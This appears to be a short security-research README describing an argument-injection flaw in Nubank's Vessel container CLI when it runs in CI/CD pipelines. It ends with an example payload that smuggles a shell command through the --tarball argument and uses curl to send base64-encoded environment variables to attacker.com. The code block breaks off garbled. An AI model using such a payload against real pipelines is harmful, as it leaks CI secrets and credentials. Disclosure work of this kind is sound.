# Security Research: Argument Injection in Nubank Vessel

## Overview
This repository contains a security analysis of [Vessel](https://github.com/nubank/vessel), a container management tool by Nubank. The research focuses on how unsanitized CLI arguments can lead to **Command Injection** or **Remote Code Execution (RCE)** when integrated into automated pipelines.

## Target Analysis
- **Project:** Vessel (Clojure-based CLI)
- **Vulnerability:** Argument Injection / RCE
- **Context:** CI/CD workflows (GitHub Actions)

## Technical Deep Dive
Vessel processes container images by interacting with registries and local filesystems. During testing, it was identified that parameters like `--tarball` and `--repository` are handled in a way that allows shell metacharacters (`;`, `&`, `|`) to be interpreted by the underlying system.



### Potential Attack Vector
If a CI/CD pipeline uses Vessel to push images based on dynamic input (e.g., branch names or pull request metadata), an attacker could trigger an RCE:

```bash
# Payload example targeting a registry push
java -jar vessel.jar push --tarball "./dummy.tar; curl [http://attacker.com/leak?data=$(env](http://attacker.com/leak?data=$(env) | base64) #" my-reg/repo
